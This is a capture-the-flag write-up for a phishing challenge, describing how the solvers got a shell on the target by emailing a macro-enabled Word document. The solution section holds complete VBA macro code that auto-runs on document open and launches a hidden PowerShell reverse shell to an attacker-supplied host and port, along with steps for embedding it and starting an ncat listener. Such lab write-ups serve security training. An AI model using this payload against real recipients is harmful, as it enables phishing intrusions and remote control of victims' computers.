# Ghost Phishing
## Challenge

We have successfully gained access to DarkSpecter's email, and this leak contains a direct connection to Cipher's latest operations. 
Within the encrypted exchanges are invaluable intelligence: Information on recent attacks, compromised systems, and which might be the next target. 
This could be our best chance to forecast Cipher's next move and dismantle his network once and for all. 

__Username:__ specter@darknetmail.corp
__Password:__ YouCantCatchMe

## Solution

When opened the DarkSpecter's email we are faced with the following:

![image](https://github.com/user-attachments/assets/8c63920d-05d8-4da1-9aac-5d020efade72)

So the first thing we did was send an simple document (txt) with a attack report and asking for a password to see what cipher responds. The response was this:

![image](https://github.com/user-attachments/assets/45925a5e-b7ee-40ec-88c0-e86ff63a8eb8)

After multiple tries, we search a bit about what could be done with docx and docm documents. We found that it is possible, using macros, do a reverse shell.
Basically, when cipher opens the document, it will run a piece of code that will connect to our machine. For this we need to activate the macros in Word. 
>File -> Options -> Customize Ribbon -> Enable Developer Options in the Right Pane.
After this, we need to create our macro code. The code is the following:

```vba
Sub AutoOpen()
MyMacro
End Sub

Sub Document_Open()
MyMacro
End Sub

Sub MyMacro()
Dim Str As String
Str = "powershell -nop -w hidden -noni -c ""$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
CreateObject("Wscript.Shell").Run Str
End Sub
```

Where it is <LHOST> and <LPORT> we put our local ip and port. 
Now for the macro work we need to do the following thing:

- Go to Developer on the menu above and select Macros.
- We need to make sure that we are creating the macro in the document we want to send. (We were struggling a bit because we were saving in other location and, because of that, we weren't managing to get a reverse shell ;( )
![image](https://github.com/user-attachments/assets/fa1de5c6-a015-45bd-83aa-139bfae30753)
- Click in create and copy and paste the code above and save.
![image](https://github.com/user-attachments/assets/cd413d35-3f42-4368-a6f5-2b18d27607d5)
- After this close the window and save the document.

After this we have our macro ready to go. We send the email with the document attached and wait for cipher make this mistake of opening it. Before sending it we need to set up a listener in our machine.
Using ncat for that:

![image](https://github.com/user-attachments/assets/4d8b02bb-38f0-4de6-93c9-ec2f6c2424c2)

Finally, we send the document in the attachments and wait for the connection.

![image](https://github.com/user-attachments/assets/44ccaa24-ec05-4b3f-bcdd-a2b0600b9109)

Now the easy part, search for the flag. It is said that we need the Administrator flag. So we looked in Administrator user and found the flag in the Desktop directory.

![image](https://github.com/user-attachments/assets/6bca2a49-26af-42ee-9e3a-b2561898ae85)
